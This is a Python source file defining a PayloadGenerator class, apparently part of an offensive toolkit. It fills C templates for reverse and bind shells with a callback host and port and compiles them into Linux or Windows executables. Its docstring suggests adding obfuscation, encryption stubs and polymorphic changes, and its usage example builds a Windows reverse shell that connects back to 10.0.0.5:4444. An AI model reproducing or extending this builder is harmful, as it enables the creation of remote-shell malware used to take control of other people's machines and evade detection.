"""
scripts/payloads/payload_generator.py

Provides a custom payload generator that compiles minimal C templates for
reverse or bind shells, enabling extensive customization without relying on msfvenom.

Features you can add:
- Multiple OS targets (Windows, Linux, macOS)
- Obfuscation or encryption stubs
- Polymorphic transformations
- Different architectures (x86, x64, ARM, etc.)

Usage example:
    from scripts.payloads.payload_generator import PayloadGenerator

    gen = PayloadGenerator(lhost="10.0.0.5", lport=4444, target_os="windows", output_format="exe")
    output_file = gen.generate("reverse_shell")
"""

import os
import subprocess
import shutil

class PayloadGenerator:
    def __init__(
        self,
        lhost="127.0.0.1",
        lport=4444,
        target_os="linux",
        output_format="elf",  # 'elf' for Linux, 'exe' for Windows
        arch="x64",
        template_dir=None
    ):
        """
        :param lhost: IP/hostname for reverse shells to connect back to
        :param lport: Port for reverse shells
        :param target_os: 'linux' or 'windows' (extendable)
        :param output_format: 'elf' for Linux, 'exe' for Windows, etc.
        :param arch: 'x64' or 'x86' or another architecture you support
        :param template_dir: Directory with the C templates
        """
        self.lhost = lhost
        self.lport = lport
        self.target_os = target_os
        self.output_format = output_format
        self.arch = arch
        self.template_dir = template_dir or os.path.join("scripts", "payloads", "templates")

        # Where to store compiled payloads by default
        self.output_directory = os.path.join("output", "payloads")
        if not os.path.exists(self.output_directory):
            os.makedirs(self.output_directory)

    def generate(self, payload_type="reverse_shell", outfile=None):
        """
        Generates the payload by:
        1) Choosing the correct template (C code)
        2) Inserting custom LHOST/LPORT
        3) Compiling with appropriate compiler commands

        :param payload_type: "reverse_shell", "bind_shell", etc.
        :param outfile: If None, we build a default filename from the settings
        :return: Path to the compiled payload file, or None if something fails
        """
        template_path = self._select_template(payload_type)
        if not template_path or not os.path.exists(template_path):
            print(f"[!] Template file not found for {payload_type}: {template_path}")
            return None

        if not outfile:
            outfile = self._build_output_filename(payload_type)

        # 1) Read the template
        with open(template_path, "r") as f:
            template_code = f.read()

        # 2) Insert LHOST, LPORT
        replaced_code = template_code.replace("LHOST_PLACEHOLDER", self.lhost)
        replaced_code = replaced_code.replace("LPORT_PLACEHOLDER", str(self.lport))

        # 3) Write the temporary code to disk
        temp_src = os.path.join(self.output_directory, f"{payload_type}_{self.target_os}_{self.arch}.c")
        with open(temp_src, "w") as f:
            f.write(replaced_code)

        # 4) Compile
        compiled_path = self._compile_code(temp_src, outfile)
        if not compiled_path:
            return None

        # Optional: remove the temp source after successful compile
        # os.remove(temp_src)
        print(f"[+] Payload generated at: {compiled_path}")
        return compiled_path

    def _select_template(self, payload_type):
        """
        Picks a template file based on OS, architecture, and payload type.
        """
        # Example file name format: <payload_type>_<os>_<arch>.c
        # e.g. reverse_shell_linux_x64.c
        filename = f"{payload_type}_{self.target_os}_{self.arch}.c"
        return os.path.join(self.template_dir, filename)

    def _build_output_filename(self, payload_type):
        """
        Construct an output filename from the OS, arch, payload type, and format.
        """
        ext = "exe" if self.output_format == "exe" else "elf"
        name = f"{payload_type}_{self.target_os}_{self.arch}.{ext}"
        return os.path.join(self.output_directory, name)

    def _compile_code(self, src_path, outfile):
        """
        Compiles the C code into an executable using gcc or mingw depending on OS target.
        """
        # This is a minimal example. Real usage might differ for cross-compiling, 
        # e.g. i686-w64-mingw32-gcc for 32-bit Windows, x86_64-w64-mingw32-gcc for 64-bit, etc.
        compiler = "gcc"
        compile_args = ["-o", outfile, src_path]

        # If we’re building for Windows:
        if self.target_os == "windows":
            # Attempting to use mingw cross-compiler, for example:
            if self.arch == "x86":
                compiler = "i686-w64-mingw32-gcc"
            else:
                compiler = "x86_64-w64-mingw32-gcc"

            # Additional linker flags might be needed, for instance:
            # compile_args += ["-lws2_32", "-lwinmm"]

        print(f"[+] Compiling with: {compiler} {' '.join(compile_args)}")
        try:
            result = subprocess.run(
                [compiler] + compile_args,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            if result.returncode != 0:
                print(f"[!] Compilation failed:\n{result.stderr}")
                return None
            return outfile
        except FileNotFoundError:
            print(f"[!] Compiler not found: {compiler}. Please install or adjust your PATH.")
            return None
        except Exception as e:
            print(f"[!] Exception during compilation: {e}")
            return None
